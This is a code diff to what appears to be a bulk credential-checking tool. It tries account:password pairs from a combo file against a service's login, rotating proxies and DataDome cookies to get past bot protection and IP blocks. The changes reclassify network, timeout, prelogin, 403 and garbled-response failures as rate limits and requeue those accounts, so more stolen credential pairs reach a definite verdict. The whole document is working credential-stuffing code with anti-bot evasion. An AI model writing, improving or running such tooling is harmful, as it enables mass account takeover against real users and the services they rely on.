@@ -1244,8 +1244,13 @@ class BulkLiveDashboard:
             num, acct, ok, reason = entry[0], entry[1], entry[2], entry[3]
             lvl = entry[4] if len(entry) > 4 else 0
             lvl_tag = f'{CY}Lv{lvl}{RST} ' if lvl else ''
-            # Reclassify rate-limit as orange "⚠ RATE LIMITED" (not red IP Blocked)
-            if reason in ('IP Blocked', 'Cookie Banned/IP Blocked'):
+            # Reclassify every "false error" (service issue, not a verdict) as
+            # orange "⚠ RATE LIMITED" so real account verdicts stay red/clear.
+            _RATE_REASONS = ('IP Blocked', 'Cookie Banned/IP Blocked',
+                             'Network Error', 'Prelogin Failed',
+                             'Invalid Server Response',
+                             'Connection/Timeout Error', 'IP Change Timeout')
+            if reason in _RATE_REASONS or str(reason).startswith('Unexpected Error'):
                 reason_disp = '⚠ RATE LIMITED'
                 rc = OR
             elif ok:
@@ -3029,14 +3034,14 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                             pass
                     time.sleep(backoff)
                     continue
+                # Network reset = false error. Defer to the back of the queue so
+                # it's retried when the network/service settles, not skipped.
                 if defer_transient:
-                    return 'TRANSIENT'
+                    return 'RATE_LIMITED'
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Network Error'}
                 live_stats.update_stats(is_error=True)
                 results_manager.add_account(err_data)
                 live_stats.push_result(success=False, error_reason='Network Error')
-                # Transient failure — the account was never actually determined,
-                # so keep it in the combo file for a re-run instead of removing it.
                 return 'ERROR'
 
             if v1 == 'NO_ACCOUNT':
@@ -3074,13 +3079,13 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                         session.proxies.clear()
                         session.proxies.update(proxy_manager.get_next())
                     continue
+                # Prelogin never answered = false error. Defer to the queue.
                 if defer_transient:
-                    return 'TRANSIENT'
+                    return 'RATE_LIMITED'
                 live_stats.update_stats(is_error=True)
                 account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Prelogin Failed'}
                 results_manager.add_account(account_data)
                 live_stats.push_result(success=False, error_reason='Prelogin Failed')
-                # Transient failure — keep the account for a re-run, don't remove it.
                 return 'ERROR'
 
             if new_datadome:
@@ -3091,6 +3096,11 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             _ratelimit_ok()   # login reached — service accepting requests
 
             if not sso_key:
+                # Real wrong-password hits are already caught upstream (ERROR_AUTH
+                # branch / error_auth JSON). A None here with no explicit auth
+                # error almost always means the login endpoint flaked — defer.
+                if defer_transient:
+                    return 'RATE_LIMITED'
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Credentials'}
                 live_stats.update_stats(valid=False)
                 results_manager.add_account(err_data)
@@ -3140,22 +3150,26 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                         # and the new IP is live, so retry fast, no long backoff.
                         time.sleep(random.uniform(0.1, 0.4))
                         continue
+                # 403 after datadome refresh exhausted — service rejecting us.
+                # Defer so the throttle has time to cool before another try.
                 if defer_transient:
-                    return 'TRANSIENT'
+                    return 'RATE_LIMITED'
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Cookie Banned/IP Blocked'}
                 live_stats.update_stats(is_error=True)
                 results_manager.add_account(err_data)
                 if auto_remove:
                     _queue_auto_remove(account, password, file_manager, combo_file_path)
                 return 'ERROR'
-            
+
             try:
                 account_data_json = response.json()
             except json.JSONDecodeError:
                 if attempt < max_retries:
-                    # [suppressed] invalid response retry print
                     time.sleep(0.2)
                     continue
+                # Garbled response body = service hiccup, not an account verdict.
+                if defer_transient:
+                    return 'RATE_LIMITED'
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Server Response'}
                 live_stats.update_stats(is_error=True)
                 results_manager.add_account(err_data)
@@ -3370,23 +3384,25 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             
         except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
             if attempt < max_retries:
-                # Reset/timeout is almost always the exit IP flipping mid-request;
-                # the new IP is already live, so retry fast instead of backing off.
                 time.sleep(random.uniform(0.1, 0.4))
                 continue
+            # Socket-level failure = false error (service / network issue).
             if defer_transient:
-                return 'TRANSIENT'
+                return 'RATE_LIMITED'
             err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Connection/Timeout Error'}
             live_stats.update_stats(is_error=True)
             results_manager.add_account(err_data)
             if auto_remove:
                 _queue_auto_remove(account, password, file_manager, combo_file_path)
             return 'ERROR'
-            
+
         except Exception as e:
             if attempt < max_retries:
                 time.sleep(0.2)
                 continue
+            # Any uncaught exception = not an account verdict; defer.
+            if defer_transient:
+                return 'RATE_LIMITED'
             logger.error(f'[ERROR] Unexpected error processing {account}')
             err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': f'Unexpected Error: {str(e)}'}
             live_stats.update_stats(is_error=True)
